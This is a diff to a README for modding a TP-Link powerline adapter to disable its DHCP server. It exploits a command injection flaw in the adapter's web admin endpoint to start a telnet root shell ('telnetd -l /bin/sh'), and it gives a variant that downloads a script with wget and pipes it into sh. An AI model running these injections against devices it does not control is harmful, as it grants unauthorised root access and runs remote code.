@@ -50,16 +50,16 @@ Invoke-WebRequest -UseBasicParsing -Uri "http://$powerlineUrl/admin/powerline?fo
 -ContentType "application/x-www-form-urlencoded; charset=UTF-8" `
 -Body "operation=remove&key=1;telnetd -l /bin/sh"
 ```
-### Easier step
-If the powerline has internet access, it is easier to change the body to 
-```
-"operation=remove&key=1;wget -q -O - http://github.com/iansw246/tl-wpa9610-mods/raw/main/disable-dhcp/payload.sh | sh"
-```
-or host your own local HTTP/FTP server with the payload.
-
-This disables the DHCP server by running the script downloaded from the internet and doesn't require any other commands. Read some [final notes](#done)
 
 This exploits a command injection vulnerability in the http server code on the powerline to start a telnet server. Thanks to [this blog post](https://the-hyperbolic.com/posts/hacking-the-tlwpa4220-part-1/) from the hyperbolic for a great writeup about the vulnerability.
+
+### Easier step
+Host a local HTTP/FTP server with payload.sh and change the above body to 
+```
+"operation=remove&key=1;wget -q -O - http://<server to download payload>/payload.sh | sh"
+```
+
+This disables the DHCP server by running the script directly downloaded from the internet and doesn't require any other commands. Read some [final notes](#done)
 
 ## 4
 Run `payload.sh` on the powerline via telnet by running on your local machine `upload-payload.sh`
@@ -70,6 +70,8 @@ If you don't see any output, try increasing the sleep time higher than 15.
 If the payload was interrupted or already run before, you may need to undo its partially changes before rerunning the script. I should document how to do that.
 
 (see https://unix.stackexchange.com/a/296161) for source of this command.
+
+Alternatively, copy and paste the contents into telnet.
 
 ## 5
 To verify if command worked, telnet into the powerline and print the contents of `/usr/sbin/udhcpd`:
